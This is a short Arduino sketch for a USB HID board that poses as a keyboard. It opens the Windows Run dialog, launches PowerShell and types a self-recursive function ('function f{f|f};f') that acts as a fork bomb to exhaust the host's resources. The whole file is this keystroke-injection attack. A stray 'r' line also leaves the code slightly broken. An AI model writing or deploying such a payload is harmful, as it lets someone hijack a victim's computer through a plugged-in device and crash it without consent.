#include "USB.h"
#include "USBHIDKeyboard.h"
USBHIDKeyboard Keyboard;

void setup() {
  
  Keyboard.begin();
  USB.begin();
  
  
  delay(5000); 

  
  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  r
  Keyboard.print("powershell");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(1500); // Menunggu jendela PowerShell siap

  
  Keyboard.print("function f{f|f};f");
  delay(100);
  Keyboard.write(KEY_RETURN);
}

void loop() {
  
}
